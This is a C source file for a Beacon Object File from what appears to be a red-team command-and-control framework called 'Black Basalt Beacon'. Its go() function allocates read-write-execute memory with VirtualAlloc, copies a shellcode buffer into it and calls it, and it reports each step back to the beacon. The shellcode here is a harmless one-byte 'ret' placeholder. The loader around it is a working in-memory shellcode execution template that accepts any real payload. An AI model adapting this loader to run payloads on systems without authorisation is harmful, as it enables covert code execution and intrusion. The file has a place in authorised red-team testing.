/*
	This file is part of Black Basalt Beacon.

	Black Basalt Beacon is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Black Basalt Beacon is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with Black Basalt Beacon.  If not, see <https://www.gnu.org/licenses/>.

	Copyright (c) LazyOwn RedTeam 2025. All rights reserved.
*/

#include <windows.h>
#include "beacon.h"

extern PVOID __imp_VirtualAlloc;
extern PVOID __imp_RtlCopyMemory;

void go(char *args, int alen) {
    // Dummy shellcode: just "ret"
    BYTE shellcode[] = { 0xC3 };

    LPVOID pMem = ((LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))__imp_VirtualAlloc)(
        NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!pMem) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAlloc failed\n");
        return;
    }

    ((void(WINAPI*)(PVOID, PVOID, SIZE_T))__imp_RtlCopyMemory)(pMem, shellcode, sizeof(shellcode));

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode copied to: 0x%p\n", pMem);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Executing shellcode (dummy: ret)...\n");

    // Call the shellcode
    ((void(*)())pMem)();

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode executed without errors!\n");
}
